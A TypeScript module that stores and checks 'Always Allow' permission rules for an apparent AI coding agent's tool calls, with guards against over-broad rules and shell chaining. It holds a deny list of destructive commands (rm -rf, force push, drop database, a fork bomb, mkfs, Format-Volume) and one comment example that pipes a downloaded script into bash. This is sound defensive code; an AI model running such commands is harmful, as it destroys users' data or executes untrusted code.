/**
 * Per-project remembered permission rules.
 *
 * When the user clicks "Always Allow" on a permission prompt, we save a rule
 * keyed by the session's cwd. Next time the same tool + matching input fires,
 * we auto-respond `allow` without showing the modal. Rules are checked in
 * `permission-modal.ts::installPermissionModalListener` before the card is
 * rendered.
 *
 * Storage shape (in app settings.json under `projectPermissionRules`):
 *   { [cwd: string]: string[] }
 *
 * Each rule string is `"<tool_name>::<pattern>"`. For Bash the pattern is a
 * prefix of `input.command`. For every other tool the pattern scopes to that
 * tool's identifying argument (e.g. `file_path` for Write/Edit/Read, `pattern`
 * for Grep/Glob - see `IDENTIFYING_FIELD`), matched by exact equality. A tool
 * with no known identifying argument gets a rule scoped to the exact input
 * JSON that was approved, never "any input" - see `matchesRule`.
 *
 * A pre-fix rule persisted with an empty pattern for a non-Bash tool meant
 * "match any input for that tool" - that was the bug. Those old rules are
 * deliberately invalidated (matchesRule always returns false for them) rather
 * than honored; the user re-clicks "Always Allow" once and a properly scoped
 * rule replaces it.
 *
 * Destructive shell command patterns are hard-coded and always bypass the
 * allow rules. Even a `Bash::` rule (any Bash) will still prompt for
 * `rm -rf`, and the same goes for `PowerShell::` and `Remove-Item -Recurse
 * -Force`. `isDestructive` keys on the tool input having a string `command`
 * field rather than a hardcoded tool-name list, since Bash and PowerShell
 * (confirmed as the two tools that carry a `command` field - see
 * `shared/chat/tool-meta.ts`'s `Bash`/`PowerShell` case) are not the only
 * shell-ish tools this app may ever add.
 */

const RULE_SEP = "::";

// Cross-shell text patterns: the same command text is destructive whether
// typed into Bash or PowerShell, so these apply unconditionally. The
// PowerShell-native `Remove-Item -Recurse -Force` family (order-independent
// flags, aliases, abbreviations) needs statement-scoped flag matching instead
// of a single regex - see `isPowerShellRecursiveForceRemoval` below.
const DESTRUCTIVE_COMMAND_PATTERNS: RegExp[] = [
  /\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r|--recursive\s+--force|--force\s+--recursive)\b/i,
  /\bgit\s+push\s+(--force\b|-f\b)/i,
  /\bgit\s+reset\s+--hard\b/i,
  /\bgit\s+clean\s+-[a-z]*f/i,
  /\bdrop\s+(database|table|schema)\b/i,
  /\btruncate\s+table\b/i,
  /:\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:/, // fork bomb
  /\bdd\s+if=/i,
  /\bmkfs(\.[a-z0-9]+)?\b/i,
  /\bformat\s+[a-z]:/i,
  /\bdel\s+\/[fs]/i,
  /\brmdir\s+\/[sq]/i,
  /\bFormat-Volume\b/i,
  /\bClear-Disk\b/i,
];

// One PowerShell statement, split on the separators that start a new command
// (`;`, newline, `|`, `&&`, `||`) - so a recurse flag on one cmdlet and a
// force flag on an unrelated later one in the same line (e.g.
// `Remove-Item file.txt; Get-ChildItem -Recurse -Force`) don't combine into a
// false positive.
const POWERSHELL_STATEMENT_SPLIT_RE = /;|\n|\|\||&&|\|/;
// Remove-Item and its aliases (Get-Alias ri, rm, del, rd, rmdir, erase).
const POWERSHELL_REMOVE_VERB_RE = /\b(remove-item|ri|rm|del|erase|rd|rmdir)\b/i;
// -Recurse, abbreviated down to the unambiguous `-r` (no other common
// Remove-Item parameter starts with r).
const POWERSHELL_RECURSE_FLAG_RE = /-r(ec\w*)?\b/i;
// -Force, abbreviated down to `-fo` - stops short of bare `-f`, which
// PowerShell itself treats as ambiguous against `-Filter`.
const POWERSHELL_FORCE_FLAG_RE = /-fo\w*\b/i;

/** `Remove-Item`/alias with both `-Recurse` and `-Force` (any order, any
 *  PowerShell-legal abbreviation) in the same statement. `Remove-Item
 *  foo.txt` (no flags) and `Get-ChildItem -Recurse` (no destructive verb)
 *  both pass through untouched. */
function isPowerShellRecursiveForceRemoval(cmd: string): boolean {
  return cmd
    .split(POWERSHELL_STATEMENT_SPLIT_RE)
    .some(
      (statement) =>
        POWERSHELL_REMOVE_VERB_RE.test(statement) &&
        POWERSHELL_RECURSE_FLAG_RE.test(statement) &&
        POWERSHELL_FORCE_FLAG_RE.test(statement),
    );
}

export interface PermissionRule {
  toolName: string;
  pattern: string; // empty = pre-fix legacy shape, never matches (see file doc)
  raw: string;     // the encoded `"toolName::pattern"` string
}

/** Each non-Bash tool's single identifying input field, confirmed against the
 *  real call sites in `shared/chat/tool-meta.ts` (`toolSummary`/`classifyTarget`)
 *  rather than assumed - Write/Edit/Read all key on `file_path`, NotebookEdit on
 *  `notebook_path`, not a shared "path" name. A tool absent from this map has no
 *  known single identifying argument, so `buildRule` falls back to scoping the
 *  rule to the exact input JSON instead of guessing a field. */
const IDENTIFYING_FIELD: Record<string, string> = {
  Read: "file_path",
  Edit: "file_path",
  MultiEdit: "file_path",
  Write: "file_path",
  NotebookEdit: "notebook_path",
  Grep: "pattern",
  Glob: "pattern",
  WebFetch: "url",
  WebSearch: "query",
  Skill: "skill",
};

function asRecord(input: unknown): Record<string, unknown> | null {
  return input && typeof input === "object" ? (input as Record<string, unknown>) : null;
}

/** Deterministic full-input snapshot for tools with no known identifying
 *  argument. Two calls that differ only in JS object key insertion order will
 *  fail to match (a false negative, just re-prompts) rather than risk a false
 *  positive - the direction this file always errs toward. */
function fullInputPattern(input: unknown): string {
  return JSON.stringify(input ?? null);
}

export function parseRule(raw: string): PermissionRule | null {
  const idx = raw.indexOf(RULE_SEP);
  if (idx < 0) return null;
  const toolName = raw.slice(0, idx);
  const pattern = raw.slice(idx + RULE_SEP.length);
  if (!toolName) return null;
  return { toolName, pattern, raw };
}

/** Build the storage key for a "always allow" choice. For Bash we lock the
 *  prefix to the entire user-typed command so future variations (different
 *  args) only match if they start with what was approved. For every other
 *  tool we lock to that tool's identifying argument (or the exact input, if
 *  the tool has none) - never to the tool name alone, which would authorize
 *  every future call regardless of target. */
export function buildRule(toolName: string, input: unknown): PermissionRule {
  if (toolName === "Bash" && input && typeof input === "object") {
    const cmd = (input as { command?: unknown }).command;
    if (typeof cmd === "string") {
      const trimmed = cmd.trim();
      return { toolName, pattern: trimmed, raw: `${toolName}${RULE_SEP}${trimmed}` };
    }
  }
  const field = IDENTIFYING_FIELD[toolName];
  const val = field ? asRecord(input)?.[field] : undefined;
  if (typeof val === "string" && val.length > 0) {
    return { toolName, pattern: val, raw: `${toolName}${RULE_SEP}${val}` };
  }
  // No known identifying argument for this tool (or it was missing/empty on
  // this particular call) - never produce a "matches any input" rule (that
  // was the bug). Scope to the exact input that was approved instead.
  const exact = fullInputPattern(input);
  return { toolName, pattern: exact, raw: `${toolName}${RULE_SEP}${exact}` };
}

export function describeRule(rule: PermissionRule): string {
  if (rule.toolName === "Bash") {
    if (!rule.pattern) return `Always allow ${rule.toolName}`;
    return `Always allow ${rule.toolName}: ${rule.pattern}`;
  }
  // A freshly built non-Bash rule never has an empty pattern (see buildRule) -
  // this only shows for an old persisted rule of the pre-fix shape, which
  // matchesRule now refuses to honor. Say so rather than repeating the old
  // (wrong) "matches everything" implication.
  if (!rule.pattern) return `Always allow ${rule.toolName} (old rule, no longer applies - re-approve to replace)`;
  if (IDENTIFYING_FIELD[rule.toolName]) return `Always allow ${rule.toolName}: ${rule.pattern}`;
  return `Always allow ${rule.toolName}: this exact input only`;
}

/** Not keyed on `toolName` at all: any tool whose input carries a string
 *  `command` field is shell-ish enough to test (today that's Bash and
 *  PowerShell - see the file-doc note above), and a tool with no `command`
 *  field always falls through to `false`, matching the prior Bash-only
 *  behavior for everything else. */
export function isDestructive(_toolName: string, input: unknown): boolean {
  const cmd = (input as { command?: unknown } | null)?.command;
  if (typeof cmd !== "string") return false;
  if (DESTRUCTIVE_COMMAND_PATTERNS.some((re) => re.test(cmd))) return true;
  return isPowerShellRecursiveForceRemoval(cmd);
}

/** A remembered Bash rule is a literal prefix, so shell chaining is also a
 *  prefix: approving `cat notes.txt` would otherwise auto-allow
 *  `cat notes.txt && curl x.sh | bash`. The rule holds only while the
 *  remainder carries no shell metacharacter. Extra plain arguments still
 *  match, which is what prefix matching is for. */
const SHELL_CHAIN_RE = /[&;|`$(){}<>\n\r]/;

export function matchesRule(rule: PermissionRule, toolName: string, input: unknown): boolean {
  if (rule.toolName !== toolName) return false;

  if (toolName === "Bash") {
    if (!rule.pattern) return true;
    const cmd = (input as { command?: unknown } | null)?.command;
    if (typeof cmd !== "string") return false;
    const trimmed = cmd.trim();
    if (!trimmed.startsWith(rule.pattern)) return false;
    return !SHELL_CHAIN_RE.test(trimmed.slice(rule.pattern.length));
  }

  // Pre-fix rules for non-Bash tools were persisted with an empty pattern
  // meaning "match any input" - exactly the over-authorization bug this file
  // closes. Deliberately invalidated: never resurrect that behaviour.
  if (!rule.pattern) return false;

  const field = IDENTIFYING_FIELD[toolName];
  if (field) {
    const val = asRecord(input)?.[field];
    return typeof val === "string" && val === rule.pattern;
  }
  // No known identifying argument: the rule was scoped to the exact approved
  // input, so only an identical input matches - never "any input".
  return fullInputPattern(input) === rule.pattern;
}

export function loadRulesForCwd(settings: Record<string, unknown>, cwd: string | null): PermissionRule[] {
  if (!cwd) return [];
  const map = settings["projectPermissionRules"];
  if (!map || typeof map !== "object") return [];
  const raw = (map as Record<string, unknown>)[cwd];
  if (!Array.isArray(raw)) return [];
  return raw
    .filter((s): s is string => typeof s === "string")
    .map(parseRule)
    .filter((r): r is PermissionRule => r !== null);
}

export function loadAllRules(settings: Record<string, unknown>): Record<string, PermissionRule[]> {
  const out: Record<string, PermissionRule[]> = {};
  const map = settings["projectPermissionRules"];
  if (!map || typeof map !== "object") return out;
  for (const [cwd, raw] of Object.entries(map as Record<string, unknown>)) {
    if (!Array.isArray(raw)) continue;
    const parsed = raw
      .filter((s): s is string => typeof s === "string")
      .map(parseRule)
      .filter((r): r is PermissionRule => r !== null);
    if (parsed.length) out[cwd] = parsed;
  }
  return out;
}

export function withAddedRule(
  settings: Record<string, unknown>,
  cwd: string,
  rule: PermissionRule,
): Record<string, unknown> {
  const next = { ...settings };
  const mapRaw = next["projectPermissionRules"];
  const map: Record<string, string[]> =
    mapRaw && typeof mapRaw === "object" ? { ...(mapRaw as Record<string, string[]>) } : {};
  const existing = Array.isArray(map[cwd]) ? [...map[cwd]] : [];
  if (!existing.includes(rule.raw)) existing.push(rule.raw);
  map[cwd] = existing;
  next["projectPermissionRules"] = map;
  return next;
}

export function withRemovedRule(
  settings: Record<string, unknown>,
  cwd: string,
  ruleRaw: string,
): Record<string, unknown> {
  const next = { ...settings };
  const mapRaw = next["projectPermissionRules"];
  if (!mapRaw || typeof mapRaw !== "object") return next;
  const map = { ...(mapRaw as Record<string, string[]>) };
  const existing = Array.isArray(map[cwd]) ? map[cwd].filter((r) => r !== ruleRaw) : [];
  if (existing.length) map[cwd] = existing;
  else delete map[cwd];
  next["projectPermissionRules"] = map;
  return next;
}
